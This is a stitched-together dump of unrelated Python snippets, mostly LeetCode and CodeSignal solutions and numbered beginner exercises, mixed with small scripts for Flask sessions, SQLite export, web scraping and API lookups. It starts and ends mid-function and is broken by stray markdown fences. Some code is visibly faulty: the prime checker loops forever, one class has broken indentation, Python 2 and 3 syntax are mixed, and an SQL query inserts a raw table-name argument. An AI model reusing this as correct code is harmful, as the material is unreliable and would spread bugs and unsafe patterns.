            result.append(product)
            product *= num
        product = 1
        for i in range(len(nums) - 1, -1, -1):
            result[i] *= product
            product *= nums[i]
        return result

from collections import deque


class Solution:
    def maxSlidingWindow(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: List[int]
        """
        q = deque()
        ret = []
        for i, num in enumerate(nums):
            # ensure the 1st element in queue is the largest
            while q and nums[q[-1]] < num:
                q.pop()
            q.append(i)
            if q[0] == i - k:
                q.popleft()
            if i >= k - 1:
                ret.append(nums[q[0]])
        return ret

def boxBlur(image):
    outImage = []
    for row in range(1, len(image) - 1):
        line = []
        for pixel in range(1, len(image[row]) - 1):
            total = (
                image[row - 1][pixel - 1]
                + image[row - 1][pixel]
                + image[row - 1][pixel + 1]
                + image[row][pixel - 1]
                + image[row][pixel]
                + image[row][pixel + 1]
                + image[row + 1][pixel - 1]
                + image[row + 1][pixel]
                + image[row + 1][pixel + 1]
            )
            line.append(total // 9)
        outImage.append(line)
    return outImage

import sys
from flask import Flask, session, url_for, redirect

app = Flask(__name__)
app.secret_key = "secret"


@app.route("/")
def set():
    session.clear()
    session["works"] = True
    return redirect(url_for("get"))


@app.route("/get")
def get():
    works = session.get("works", False)
    return str(works)


app.run(sys.argv[1], use_reloader=False)

# 23. Write a Python Program to check whether a given number is a Palindrome or Not


num = int(input("Enter a number: "))

temp = num

rev_num = 0

while num > 0:
    digits = num % 10
    rev_num = rev_num * 10 + digits
    num = num // 10

if temp == rev_num:
    print("Entered num is a palindrome")
else:
    print("Entered num is not a palindrome")

def minesweeper(matrix):
    row = len(matrix)
    col = len(matrix[0])

    def neighbouring_squares(i, j):
        return sum(
            matrix[x][y]
            for x in range(i - 1, i + 2)
            if 0 <= x < row
            for y in range(j - 1, j + 2)
            if 0 <= y < col
            if i != x or j != y
        )

    return [[neighbouring_squares(i, j) for j in range(col)] for i in range(row)]

# Definition for singly-linked list.
class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def swapPairs(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        dummy = p = ListNode(0)
        dummy.next = head
        while head and head.next:
            curr = head.next
            head.next, curr.next = curr.next, head
            p.next = curr
            p = head
            head = head.next
        return dummy.next

# time complexity: O(m+n)
class Solution:
    def searchMatrix(self, matrix, target):
        """
        :type matrix: List[List[int]]
        :type target: int
        :rtype: bool
        """
        if not matrix or len(matrix) == 0 or not matrix[0]:
            return False
        m, n = len(matrix), len(matrix[0])
        row, col = 0, n - 1
        while row < m and col >= 0:
            if matrix[row][col] == target:
                return True
            elif matrix[row][col] < target:
                row += 1
            else:
                col -= 1
        return False

class Solution:
    def shortestDistance(self, words, word1, word2):
        """
        :type words: List[str]
        :type word1: str
        :type word2: str
        :rtype: int
        """
        idx1, idx2 = len(words), len(words)
        result = len(words)
        for i in range(len(words)):
            if words[i] == word1:
                idx1 = i
                result = min(result, abs(idx2 - idx1))
            if words[i] == word2:
                idx2 = i
                result = min(result, abs(idx2 - idx1))
        return result

from collections import defaultdict

# Time: O(m+n)
class WordDistance:
    def __init__(self, words: List[str]):
        self.d = defaultdict(list)
        for i, word in enumerate(words):
            self.d[word].append(i)

    def shortest(self, word1: str, word2: str) -> int:
        loc1 = self.d[word1]
        loc2 = self.d[word2]
        result = float("inf")
        i, j = 0, 0
        while i < len(loc1) and j < len(loc2):
            result = min(result, abs(loc2[j] - loc1[i]))
            if loc1[i] < loc2[j]:
                i += 1
            else:
                j += 1
        return result

class Solution(object):
    def isStrobogrammatic(self, num):
        """
        :type num: str
        :rtype: bool
        """
        mapping = {"6": "9", "8": "8", "1": "1", "9": "6", "0": "0"}
        l, r = 0, len(num) - 1
        while l <= r:
            if num[l] not in mapping or num[r] not in mapping:
                return False
            if num[l] != mapping[num[r]]:
                return False
            l += 1
            r -= 1
        return True

class Solution:
    def groupStrings(self, strings: List[str]) -> List[List[str]]:
        d = {}
        for s in strings:
            key = []
            for i in range(1, len(s)):
                key.append(str((ord(s[i]) - ord(s[i - 1])) % 26))
            k = ",".join(key)
            d[k] = d.get(k, []) + [s]
        return list(d.values())

def minesweeper(matrix):
    TOP = 0
    BOTTOM = len(matrix) - 1
    LEFT = 0
    RIGHT = len(matrix[0]) - 1

    outMatrix = []
    for row in range(len(matrix)):
        outRow = []
        for cell in range(len(matrix[row])):
            outRow.append(0)
            if row != TOP:
                outRow[cell] += matrix[row - 1][cell]
            if row != BOTTOM:
                outRow[cell] += matrix[row + 1][cell]
            if cell != LEFT:
                outRow[cell] += matrix[row][cell - 1]
            if cell != RIGHT:
                outRow[cell] += matrix[row][cell + 1]
            if row != TOP and cell != LEFT:
                outRow[cell] += matrix[row - 1][cell - 1]
            if row != TOP and cell != RIGHT:
                outRow[cell] += matrix[row - 1][cell + 1]
            if row != BOTTOM and cell != LEFT:
                outRow[cell] += matrix[row + 1][cell - 1]
            if row != BOTTOM and cell != RIGHT:
                outRow[cell] += matrix[row + 1][cell + 1]
        outMatrix.append(outRow)
    return outMatrix

import sys
import csv
import sqlite3

if len(sys.argv) < 3:
    print("Use: {0} DATABASE_NAME TABLE_NAME".format(sys.argv[0]))
    exit()

conn = sqlite3.connect(sys.argv[1])
cur = conn.cursor()
data = cur.execute("SELECT * FROM {0}".format(sys.argv[2]))

with open("output.csv", "wb") as f:
    writer = csv.writer(f)
    writer.writerows(data)

conn.close()

# 24. Write a Python program to check if a number is a Amstrong number or note

number = int(input("Enter a number: "))

temp = number

res = 0

while number > 0:

    digit = number % 10
    res = res + (digit * digit * digit)
    number = number // 10

if res == temp:
    print("Entered number is amstrong!")
else:
    print("Not a amstrong!")

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    return [x if x != elemToReplace else substitutionElem for x in inputArray]

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def reverseKGroup(self, head: ListNode, k: int) -> ListNode:
        dummy = p = ListNode(0)
        dummy.next = head
        l, r = head, head
        while True:
            count = 0
            while r and count < k:
                r = r.next
                count += 1
            if count == k:
                curr, prev = l, r
                for _ in range(k):
                    curr.next, prev, curr = prev, curr, curr.next
                p.next, p, l = prev, l, r
            else:
                return dummy.next

from collections import deque


class Vector2D(object):
    def __init__(self, vec2d):
        """
        Initialize your data structure here.
        :type vec2d: List[List[int]]
        """
        self.row = 0
        self.col = 0
        self.vec2d = vec2d

    def next(self):
        """
        :rtype: int
        """
        result = self.vec2d[self.row][self.col]
        self.col += 1
        return result

    def hasNext(self):
        """
        :rtype: bool
        """
        while self.row < len(self.vec2d):
            if self.col < len(self.vec2d[self.row]):
                return True
            else:
                self.row += 1
                self.col = 0
        return False

        # Your Vector2D object will be instantiated and called as such:
        # i, v = Vector2D(vec2d), []
        # while i.hasNext(): v.append(i.next())

class Solution:
    def canAttendMeetings(self, intervals: List[List[int]]) -> bool:
        intervals = sorted(intervals, key=lambda x: x[1])
        end = -1
        for interval in intervals:
            if interval[0] >= end:
                end = interval[1]
                continue
            return False
        return True

class Solution:
    def minMeetingRooms(self, intervals: List[List[int]]) -> int:
        if not intervals:
            return 0
        result, curr = 0, 0
        for i, val in sorted(
            x for interval in intervals for x in [(interval[0], 1), (interval[1], -1)]
        ):
            curr += val
            result = max(curr, result)
        return result


# import heapq
#
#
# class Solution:
#     def minMeetingRooms(self, intervals: List[List[int]]) -> int:
#         if not intervals: return 0
#         q = []
#         for interval in sorted(intervals, key=lambda x: x[0]):
#             if not q:
#                 heapq.heappush(q, interval[1])
#             else:
#                 if interval[0] >= q[0]:
#                     heapq.heappop(q)
#                 heapq.heappush(q, interval[1])
#         return len(q)

class Solution:
    def minCost(self, costs):
        """
        :type costs: List[List[int]]
        :rtype: int
        """
        prev = [0] * 3
        for cost in costs:
            prev = [cost[i] + min(prev[:i] + prev[i + 1 :]) for i in range(3)]
        return min(prev)
````

````py
 Given a binary tree, return all root-to-leaf paths.

 Note: A leaf is a node with no children.

 Example:

 Input:

    1
  /   \
 2     3
  \
   5

 Output: ["1->2->5", "1->3"]

 Explanation: All root-to-leaf paths are: 1->2->5, 1->3```


```py

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def binaryTreePaths(self, root):
        """
        :type root: TreeNode
        :rtype: List[str]
        """
        if not root:
            return []

        paths = []

        def dfs(root, curr):
            if root.left is None and root.right is None:
                paths.append(curr + str(root.val))
                return

            if root.left:
                dfs(root.left, curr + str(root.val) + "->")
            if root.right:
                dfs(root.right, curr + str(root.val) + "->")

        curr = ""
        dfs(root, curr)
        return paths

class Solution:
    def addDigits(self, num: int) -> int:
        if not num:
            return 0
        return (num - 1) % 9 + 1

        # while num // 10 != 0:
        #         #     result = 0
        #         #     while num:
        #         #         num, remainder = divmod(num, 10)
        #         #         result += remainder
        #         #     num = result
        #         # return num

class Solution:
    def threeSumSmaller(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: int
        """
        nums.sort()
        ret = 0

        for i in range(len(nums)):
            l, r = i + 1, len(nums) - 1
            while l < r:
                ss = nums[i] + nums[l] + nums[r]
                if ss < target:
                    ret += r - l
                    l += 1
                else:
                    r -= 1
        return ret

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    return [x if x != elemToReplace else substitutionElem for x in inputArray]

# 25. Write a Python Program to chekck whether a given number is strong or not

number = int(input("Enter the number: "))
# store in temp variable
temp = number

# initiate result as 0
res = 0

# while loop for getting individual digits
while number:

    i = 1
    f = 1

    digit = number % 10

    # while loop for factorial
    while i <= digit:
        f = f * i
        i = i + 1
    res = res + f
    number = number // 10

# comparing res and temp
if res == temp:
    print("Entered number is strong!")
else:
    print("Entered number is not strong!")

def evenDigitsOnly(n):
    return all(
        (True if digit in ("0", "2", "4", "6", "8") else False for digit in str(n))
    )

class Solution:
    def removeDuplicates(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return 0
        idx = 0
        for n in nums[1:]:
            if n != nums[idx]:
                idx += 1
                nums[idx] = n
        return idx + 1

class Solution:
    def validTree(self, n: int, edges: List[List[int]]) -> bool:
        roots = list(range(n))
        count = n

        def find(node):
            root = node
            while roots[root] != root:
                root = roots[root]
            while node != root:
                roots[node], node = root, roots[node]
            return root

        def union(x, y):
            roots[x] = y

        for edge in edges:
            x, y = edge[0], edge[1]
            if find(x) == find(y):
                return False
            union(find(x), find(y))
            count -= 1
        return count == 1

# Time: O(nk)
class Solution:
    def minCostII(self, costs: List[List[int]]) -> int:
        if not costs:
            return 0
        n, k = len(costs), len(costs[0])
        for i in range(1, n):
            min1 = min(costs[i - 1])
            idx = costs[i - 1].index(min1)
            min2 = min(costs[i - 1][:idx] + costs[i - 1][idx + 1 :])
            for j in range(k):
                if j == idx:
                    costs[i][j] += min2
                else:
                    costs[i][j] += min1
        return min(costs[-1])

class Solution:
    def missingNumber(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        n = len(nums)
        return n * (n + 1) // 2 - sum(nums)

def evenDigitsOnly(n):
    return all(
        (True if digit in ("0", "2", "4", "6", "8") else False for digit in str(n))
    )

import requests
from lxml import html
from collections import defaultdict


def get_stocks(url):
    # Make Request
    page = requests.get(url)
    # Parse/Scrape
    tree = html.fromstring(page.text)
    xpath = '//*[@id="mw-content-text"]/table[1]'
    rows = tree.xpath(xpath)[0].findall("tr")
    rows = [(row.getchildren()[0], row.getchildren()[3]) for row in rows[1:]]
    rows = [(row[0].getchildren()[0].text, row[1].text) for row in rows]
    industries = defaultdict(list)
    for row in rows:
        industries[row[1]].append(row[0])
    return industries


def output_data(data_dict):
    for industry in data_dict:
        print("\n" + industry)
        print("-" * len(industry))
        for ticker in data_dict[industry]:
            print(ticker)


if __name__ == "__main__":
    url = "http://en.wikipedia.org/wiki/List_of_S%26P_500_companies"
    scraped_data = get_stocks(url)
    output_data(scraped_data)

# 26. Write a Python Program to check if the given number is Prime number or not.

number = int(input("Enter the number: "))

# init an empty array
f = []


while number > 0:
    # condition for 0
    if number == 0:
        print("0 is not a prime ")
    # condition for 1
    elif number == 1:
        print("1 is not a prime")
    else:
        # getting factors
        for i in range(1, number + 1):
            if number % i == 0:
                # appending to the array
                f.append(i)
if len(f) > 2:
    print("The number entered is NOT a Prime")
else:
    print("The number entered is a Prime")

class Solution:
    def removeElement(self, nums: List[int], val: int) -> int:
        if not nums:
            return 0
        idx = 0
        for n in nums:
            if n != val:
                nums[idx] = n
                idx += 1
        return idx

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def closestValue(self, root: TreeNode, target: float) -> int:
        prev = root.val
        while root:
            if abs(prev - target) > abs(root.val - target):
                prev = root.val
            if target < root.val:
                root = root.left
            else:
                root = root.right
        return prev

class Solution:
    def hIndex(self, citations):
        """
        :type citations: List[int]
        :rtype: int
        """
        # citations.sort()
        # n = len(citations)
        # for i in range(n):
        #     if citations[i] >= n - i:
        #         return n - i
        # return 0

        n = len(citations)
        counts = [0] * (n + 1)
        for i in range(n):
            if citations[i] > n:
                counts[n] += 1
            else:
                counts[citations[i]] += 1
        total = 0
        for i in range(n, -1, -1):
            total += counts[i]
            if total >= i:
                return i
        return 0

class Solution:
    def hIndex(self, citations):
        """
        :type citations: List[int]
        :rtype: int
        """
        n = len(citations)
        for i in range(n):
            if citations[i] >= n - i:
                return n - i
        return 0

class Solution:
    def numWays(self, n, k):
        """
        :type n: int
        :type k: int
        :rtype: int
        """
        if n == 1:
            return k
        if n == 2:
            return k * k
        same, diff = k, k * (k - 1)
        for i in range(3, n + 1):
            same, diff = diff, (same + diff) * (k - 1)
        return same + diff

# The knows API is already defined for you.
# return a bool, whether a knows b
# def knows(a: int, b: int) -> bool:


class Solution:
    def findCelebrity(self, n: int) -> int:
        candidate = 0
        for i in range(1, n):
            if knows(candidate, i):
                candidate = i

        for i in range(n):
            if (i != candidate and knows(candidate, i)) or (
                i != candidate and not knows(i, candidate)
            ):
                return -1
        return candidate

# The isBadVersion API is already defined for you.
# @param version, an integer
# @return an integer
# def isBadVersion(version):


class Solution:
    def firstBadVersion(self, n):
        """
        :type n: int
        :rtype: int
        """
        left, right = 1, n
        while left < right:
            mid = left + (right - left) // 2
            if isBadVersion(mid):
                right = mid
            else:
                left = mid + 1
        return right

class Solution:
    def numSquares(self, n: int) -> int:
        if n <= 0:
            return 0
        dp = [0]

        while len(dp) < n + 1:
            i, m = 1, len(dp)
            square_count = float("inf")
            while i * i <= m:
                square_count = min(square_count, dp[m - i * i] + 1)
                i += 1
            dp.append(square_count)

        return dp[n]

import requests

message = raw_input("Enter a Message: ")
number = raw_input("Enter the phone number: ")


payload = {"number": number, "message": message}
r = requests.post("http://textbelt.com/text", data=payload)
if r.json()["success"]:
    print("Success!")
else:
    print("Error!")

class Solution:
    def strStr(self, haystack: str, needle: str) -> int:
        if haystack == needle or not needle:
            return 0
        if not haystack:
            return -1
        for i in range(len(haystack) - len(needle) + 1):
            for j in range(len(needle)):
                if haystack[i + j] != needle[j]:
                    break
                if j == len(needle) - 1:
                    return i
        return -1

'''
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]
By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].
'''

class Solution(object):
 def __init__(self, v1, v2):
  self.v1 = v1
  self.v2 = v2
  self.index_v1 = 0
  self.index_v2 = 0

 def next(self):
  result = -1
  if self.index_v1 != len(self.v1) and self.index_v1 <= self.index_v2:
   result = self.v1[self.index_v1]
   self.index_v1 += 1
  else:
   result = self.v2[self.index_v2]
   self.index_v2 += 1

  return result

 def hasNext(self):
  return self.index_v1 < len(self.v1) or self.index_v2 < len(self.v2)


solution = Solution([1, 2], [3, 4, 5, 6])
while solution.hasNext():
 print solution.next()
class Solution:
    def addOperators(self, num: str, target: int) -> List[str]:
        result = []

        def backtrack(idx, path, value, prev):
            if idx == len(num) and value == target:
                result.append(path)
                return

            for i in range(idx + 1, len(num) + 1):
                s = num[idx:i]
                n = int(s)
                if s != "0" and s[0] == "0":
                    continue
                if prev is None:
                    backtrack(i, s, n, n)
                else:
                    backtrack(i, path + "+" + s, value + n, n)
                    backtrack(i, path + "-" + s, value - n, -n)
                    backtrack(i, path + "*" + s, value - prev + prev * n, prev * n)

        backtrack(0, "", 0, None)
        return result

class Solution:
    def moveZeroes(self, nums: List[int]) -> None:
        """
        Do not return anything, modify nums in-place instead.
        """
        start, end = 0, 0
        while end < len(nums):
            if nums[end] != 0:
                nums[start] = nums[end]
                start += 1
            end += 1
        if start < len(nums):
            nums[start:] = [0] * (len(nums) - start)

'''
 Given a binary search tree and a node in it, find the in-order successor of that node in the BST.
 Note: If the given node has no in-order successor in the tree, return null
'''

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

class Solution(object):
    def inorderSuccessor(self, root, p):
        """
        :type root: TreeNode
        :type p: TreeNode
        :rtype: TreeNode
  """

  if not root or not p:
   return None

  if p.right:
   p = p.right
   while p.left:
    p = p.left
   return p

  successor = None
  while root and root != p:
   if root.val > p.val:
    successor = root
    root = root.left
   else:
    root = root.right
  return successor
from collections import deque


class Solution:
    def wallsAndGates(self, rooms: List[List[int]]) -> None:
        """
        Do not return anything, modify rooms in-place instead.
        """
        if not rooms or not rooms[0]:
            return
        m, n = len(rooms), len(rooms[0])
        q = deque()
        for i in range(m):
            for j in range(n):
                if rooms[i][j] == 0:
                    q.append((i, j))
        while q:
            i, j = q.popleft()
            for nn in [(-1, 0), (1, 0), (0, 1), (0, -1)]:
                x, y = i + nn[0], j + nn[1]
                if 0 <= x < m and 0 <= y < n and rooms[x][y] == 2147483647:
                    rooms[x][y] = rooms[i][j] + 1
                    q.append((x, y))

# Time: O(nlogn)


class Solution:
    def findDuplicate(self, nums: List[int]) -> int:
        result = 0
        l, r = 1, len(nums) - 1
        while l <= r:
            mid = l + (r - l) // 2
            count = self.getCount(mid, nums)
            if count > mid:
                result = mid
                r = mid - 1
            else:
                l = mid + 1
        return result

    def getCount(self, val, nums):
        count = 0
        for num in nums:
            if num <= val:
                count += 1
        return count

class Solution(object):
    def gameOfLife(self, board):
        """
        :type board: List[List[int]]
        :rtype: void Do not return anything, modify board in-place instead.
        """
        index = []

        def around(i, j, board):
            count = 0
            for k in range(i - 1, i + 2):
                for l in range(j - 1, j + 2):
                    if 0 <= k < len(board) and 0 <= l < len(board[0]):
                        if board[k][l] == 1:
                            count += 1

            return count - 1 if board[i][j] == 1 else count

        for i in range(len(board)):
            for j in range(len(board[0])):
                count = around(i, j, board)
                if board[i][j] == 1:
                    if count > 3 or count < 2:
                        index.append([i, j, 0])
                else:
                    if count == 3:
                        index.append([i, j, 1])

        while index:
            i, j, value = index.pop()
            board[i][j] = value

def alphabeticShift(inputString):
    return "".join([chr(ord(x) + 1) if x != "z" else "a" for x in inputString])

import requests

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
}

data = {
    "pay_rate": "10000",
    "filing_status": "single",
    "pay_periods": 1,
    "state": "CO",
    "year": "2014",
}

r = requests.post("http://taxee.io/api/v1/calculate/2014", data=data, headers=headers)

print(r.text)

def chessBoardCellColor(cell1, cell2):
    cell1_elm = ord(cell1[0]) + int(cell1[1])
    cell2_elm = ord(cell2[0]) + int(cell2[1])
    return (cell1_elm + cell2_elm) % 2 == 0

class Solution:
    def divide(self, dividend: int, divisor: int) -> int:
        sign = (dividend > 0) == (divisor > 0)
        dividend, divisor = abs(dividend), abs(divisor)
        result = 0
        while dividend >= divisor:
            temp = 0
            while dividend >= (divisor << temp + 1):
                temp += 1
            result += 1 << temp
            dividend -= divisor << temp
        return min(result, 2147483647) if sign else -result

class Solution:
    def wordPattern(self, pattern: str, str: str) -> bool:
        ss = str.split()
        return len(set(zip(pattern, ss))) == len(set(pattern)) == len(set(ss)) and len(
            ss
        ) == len(pattern)


class Solution:
    def wordPattern(self, pattern: str, str: str) -> bool:
        def convert(s):
            m = {}
            return [m.setdefault(c, len(m)) for c in s]

        return convert(pattern) == convert(str.split())

class Solution:
    def wordPatternMatch(self, pattern: str, str: str) -> bool:
        visited_pattern = {}
        visited_str = set()

        def backtrack(i, j):
            if i == len(pattern) and j == len(str):
                return True
            if i == len(pattern) or j == len(str):
                return False
            c = pattern[i]
            if c in visited_pattern:
                mapped_str = visited_pattern[c]
                if str.startswith(mapped_str, j):
                    return backtrack(i + 1, j + len(mapped_str))
                else:
                    return False
            else:
                for end in range(j + 1, len(str) + 1):
                    ss = str[j:end]
                    if ss in visited_str:
                        continue
                    visited_pattern[c] = ss
                    visited_str.add(ss)
                    if backtrack(i + 1, end):
                        return True
                    del visited_pattern[c]
                    visited_str.remove(ss)
                return False

        return backtrack(0, 0)

class Solution:
    def minTotalDistance(self, grid: List[List[int]]) -> int:
        m, n = len(grid), len(grid[0])
        l1, l2 = [], []
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 1:
                    l1.append(i)
                    l2.append(j)

        def getMin(l):
            result = 0
            left, right = 0, len(l) - 1
            l.sort()
            while left < right:
                result += l[right] - l[left]
                right -= 1
                left += 1
            return result

        return getMin(l1) + getMin(l2)

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Codec:
    def serialize(self, root):
        """Encodes a tree to a single string.

        :type root: TreeNode
        :rtype: str
        """
        vals = []

        def preorder(node):
            if not node:
                vals.append("#")
                return
            vals.append(str(node.val))
            preorder(node.left)
            preorder(node.right)

        preorder(root)

        return " ".join(vals)

    def deserialize(self, data):
        """Decodes your encoded data to tree.

        :type data: str
        :rtype: TreeNode
        """

        def preorder():
            val = next(vals)
            if val == "#":
                return None
            node = TreeNode(int(val))
            node.left = preorder()
            node.right = preorder()
            return node

        vals = iter(data.split())
        return preorder()


# Your Codec object will be instantiated and called as such:
# ser = Codec()
# deser = Codec()
# ans = deser.deserialize(ser.serialize(root))

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def longestConsecutive(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        if not root:
            return 0
        result = 0
        stack = [(root, 1)]
        while stack:
            node, curr = stack.pop()
            if node.left:
                stack.append(
                    (node.left, curr + 1 if node.left.val == node.val + 1 else 1)
                )
            if node.right:
                stack.append(
                    (node.right, curr + 1 if node.right.val == node.val + 1 else 1)
                )
            result = max(result, curr)
        return result

class Solution:
    def getHint(self, secret: str, guess: str) -> str:
        s = {}
        g = {}
        bulls, cows = 0, 0
        for i in range(len(secret)):
            if secret[i] == guess[i]:
                bulls += 1
            else:
                s[secret[i]] = s.get(secret[i], 0) + 1
                g[guess[i]] = g.get(guess[i], 0) + 1
        for k in s:
            if k in g:
                cows += min(g[k], s[k])
        return "{}A{}B".format(bulls, cows)

def chessBoardCellColor(cell1, cell2):
    color1 = ((ord(cell1[0]) - ord("A")) + ord(cell1[1]) - ord("1")) % 2 == 0
    color2 = ((ord(cell2[0]) - ord("A")) + ord(cell2[1]) - ord("1")) % 2 == 0
    return color1 == color2

import sys
import json
import yaml
````

````py
Example usage:

$ python 29_json_to_yaml.py 29_json_test.json```


```py

# load json data
json_data = json.loads(open(sys.argv[1]).read())
# convert unicode to string
converted_json_data = json.dumps(json_data)
# output yaml
print(yaml.dump(yaml.load(converted_json_data), default_flow_style=False))

import math


def hourglassSum(arr):
    s = -math.inf
    maxSum = -math.inf
    for i in range(len(arr) - 2):
        for j in range(len(arr[0]) - 2):
            s = (
                arr[i][j]
                + arr[i][j + 1]
                + arr[i][j + 2]
                + arr[i + 1][j + 1]
                + arr[i + 2][j]
                + arr[i + 2][j + 1]
                + arr[i + 2][j + 2]
            )
            if s > maxSum:
                maxSum = s
    return maxSum

# 2. Write a Python Program to check if a given number is String or Not

x = input("Enter the input which has to be checked: ")

try:
    val = int(x)
    print("Entered value is an Integer")
except:
    print("Entered value is a String")

'''
Michael Galarnyk

1. Define a function named to_number(str) that takes a string as a parameter, converts it to an int value, and returns that int value.
2. Define a function named add_two(n1, n2) that takes two ints as parameters, sums them, and then returns that int sum value.
3. Define a function named cube(n) that takes numeric value as a parameter, cubes that value, and then returns that resulting numeric value.
4. Use the above functions in one statement to take two string literals, convert them to ints, add them together, cube the result, and print the cubed value.

'''

def to_number(string):
    new_int = int(string)
    return new_int

def add_two(n1,n2):
    summation = n1 + n2
    return summation

def cube(n):
    cubed = n**3
    return cubed

print cube(add_two(to_number('6'),to_number('5')))

records = [
    ("Alice", "Engineering"),
    ("Bob", "Sales"),
    ("Carol", "Sales"),
    ("Erin", "Engineering"),
    ("Dave", "Engineering"),
    ("Frank", "Engineering"),
    ("Grace", "Marketing"),
]


def build_index(rec):
    # build the index from the list
    idx = {}

    for r in rec:
        name, dept = r

        if dept not in idx:
            idx[dept] = []

        idx[dept].append(name)

    return idx


idx = build_index(records)

print(idx)
# print all the departments
for i in idx:
    print(i)

# print everyone in Engineering:
idx["Engineering"].sort()
# ['Alice', 'Erin', 'Dave', 'Frank'].sort()
print(f"Engineering: {idx['Engineering']}")

# Time: O(n)


class Solution:
    def lengthOfLongestSubstring(self, s: str) -> int:
        start, d = 0, {}
        result = 0
        for i, val in enumerate(s):
            if val in d and d[val] >= start:
                start = d[val] + 1
            d[val] = i
            result = max(result, i - start + 1)
        return result

class Solution:
    def findSubstring(self, s: str, words: List[str]) -> List[int]:
        if not s or not words or len(s) == 0 or len(words) == 0:
            return []
        m, n = len(words[0]), len(words)
        result = []
        d = Counter(words)
        for start in range(min(m, len(s) - n * m + 1)):
            new_start = start
            end = start
            new_d = {}
            while new_start < len(s) - n * m + 1:
                w = s[end : end + m]
                end += m
                if w not in d:
                    new_d = {}
                    new_start = end
                else:
                    new_d[w] = new_d.get(w, 0) + 1
                    while new_d[w] > d[w]:
                        new_d[s[new_start : new_start + m]] -= 1
                        new_start += m

                    if new_start + n * m == end:
                        result.append(new_start)

        return result

class Solution:
    def lengthOfLIS(self, nums: List[int]) -> int:
        if not nums:
            return 0
        if len(nums) <= 1:
            return len(nums)
        tails = [0] * len(nums)
        result = 0
        for x in nums:
            i, j = 0, result
            while i != j:
                m = (i + j) // 2
                if tails[m] < x:
                    i = m + 1
                else:
                    j = m
            tails[i] = x
            result = max(i + 1, result)
        return result

class NumArray(object):
    def __init__(self, nums):
        n = len(nums)
        self.sum = [0] * (n + 1)
        for i in range(n):
            self.sum[i + 1] = self.sum[i] + nums[i]

    def sumRange(self, i, j):
        """
        :param i: int
        :param j: int
        :return: int
        """
        return self.sum[j + 1] - self.sum[i]

class NumMatrix(object):
    def __init__(self, matrix):
        """
        :type matrix: List[List[int]]
        """
        if not matrix:
            return
        rows = len(matrix)
        cols = len(matrix[0]) if rows > 0 else 0
        self.sums = [[0 for j in range(cols + 1)] for i in range(rows + 1)]
        for i in range(1, rows + 1):
            for j in range(1, cols + 1):
                self.sums[i][j] = (
                    matrix[i - 1][j - 1]
                    + self.sums[i - 1][j]
                    + self.sums[i][j - 1]
                    - self.sums[i - 1][j - 1]
                )

    def sumRegion(self, row1, col1, row2, col2):
        """
        :type row1: int
        :type col1: int
        :type row2: int
        :type col2: int
        :rtype: int
        """
        return (
            self.sums[row2 + 1][col2 + 1]
            - self.sums[row1][col2 + 1]
            - self.sums[row2 + 1][col1]
            + self.sums[row1][col1]
        )

class NumArray:
    def __init__(self, nums: List[int]):
        self.n = len(nums)
        self.nums, self.tree = nums, [0] * (self.n + 1)
        for i in range(self.n):
            j = i + 1
            while j <= self.n:
                self.tree[j] += nums[i]
                j += j & -j

    def update(self, i: int, val: int) -> None:
        diff, self.nums[i] = val - self.nums[i], val
        j = i + 1
        while j <= self.n:
            self.tree[j] += diff
            j += j & -j

    def sumRange(self, i: int, j: int) -> int:
        result = 0
        j += 1
        while j > 0:
            result += self.tree[j]
            j -= j & -j
        while i > 0:
            result -= self.tree[i]
            i -= i & -i
        return result


# Your NumArray object will be instantiated and called as such:
# obj = NumArray(nums)
# obj.update(i,val)
# param_2 = obj.sumRange(i,j)

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        # three states
        # s0: not holding any stock but can buy or wait
        # s1: holding stocks, can sell or wait
        # s2: not holding any stock due to selling stock that day, enter lockdown period
        s0, s1, s2 = 0, float("-inf"), 0
        for price in prices:
            s1 = max(s1, s0 - price)
            s0 = max(s0, s2)
            s2 = s1 + price
        return max(s0, s2)

import os
import sys
import requests
````

````py

1. pip install requests
2. Obtain an API key: https://www.fullcontact.com/developer/pricing/

Example usage:

$ python 30_fullcontact.py email SOME@EMAIL.COM
$ python 30_fullcontact.py twitter TWITTER_HANDLE```


```py


# constants

API_KEY = os.environ.get("FULLCONTACT_API_KEY")
BASE_URL = "http://api.fullcontact.com/v2/person.json"


# helpers


def get_arguments():
    if len(sys.argv) is 3:
        return {"media": sys.argv[1], "user_info": sys.argv[2]}
    else:
        print("Specify at least 1 argument")
        sys.exit()


def call_api(contact):
    url = BASE_URL + "?{0}={1}&apiKey={2}".format(
        contact["media"], contact["user_info"], API_KEY
    )
    r = requests.get(url)
    if r.status_code == 200:
        return r.text
    else:
        return "Sorry, no results found."


# main

if __name__ == "__main__":
    media = get_arguments()
    print(call_api(media))

def depositProfit(deposit, rate, threshold):
    year = 0
    while deposit < threshold:
        deposit *= 1 + (rate / 100)
        year += 1
    return year

class Solution:
    def nextPermutation(self, nums: List[int]) -> None:
        """
        Do not return anything, modify nums in-place instead.
        """
        n = len(nums)
        i = n - 1
        while i > 0:
            if nums[i - 1] < nums[i]:
